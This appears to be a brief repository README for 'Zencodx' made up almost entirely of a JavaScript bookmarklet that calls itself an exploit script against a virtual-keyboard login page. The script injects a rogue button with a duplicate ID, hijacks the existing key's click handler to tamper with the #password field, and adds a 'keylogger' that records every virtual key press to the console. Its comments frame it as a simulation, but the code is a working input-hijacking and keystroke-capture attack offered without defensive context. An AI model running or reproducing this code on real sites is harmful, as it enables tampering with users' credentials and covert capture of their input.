# Zencodx
Code for Zencodex webpage
javascript:(function(){
  // 1. Find duplicate IDs
  const ids = {};
  document.querySelectorAll('[id]').forEach(el => {
    if (ids[el.id]) {
      console.warn("Duplicate ID found:", el.id, el);
    } else {
      ids[el.id] = true;
    }
  });

  // 2. Inject a rogue key (simulate attacker adding own key)
  const rogueKey = document.createElement('button');
  rogueKey.id = "key-A"; // Intentional duplicate
  rogueKey.innerText = "Rogue A";
  rogueKey.style = "background:red;color:white;margin:5px;";
  rogueKey.onclick = function() {
    alert("Rogue key pressed - input hijacked!");
    const pwField = document.querySelector('#password');
    if (pwField) pwField.value += '!';
  };
  document.body.appendChild(rogueKey);

  // 3. Hijack existing key event (simulate input tampering)
  const realKey = document.getElementById('key-A');
  if (realKey) {
    realKey.onclick = () => {
      console.log("Hijacked original key-A");
      const pwField = document.querySelector('#password');
      if (pwField) pwField.value += '*';
    };
  }

  // 4. Keylogger: log every virtual key press
  document.querySelectorAll('button[id^="key-"]').forEach(btn => {
    btn.addEventListener('click', () => {
      console.log("[Keylogger] Captured virtual key:", btn.innerText);
    });
  });

  alert("Exploit script injected. Open DevTools console to see logs.");
})();
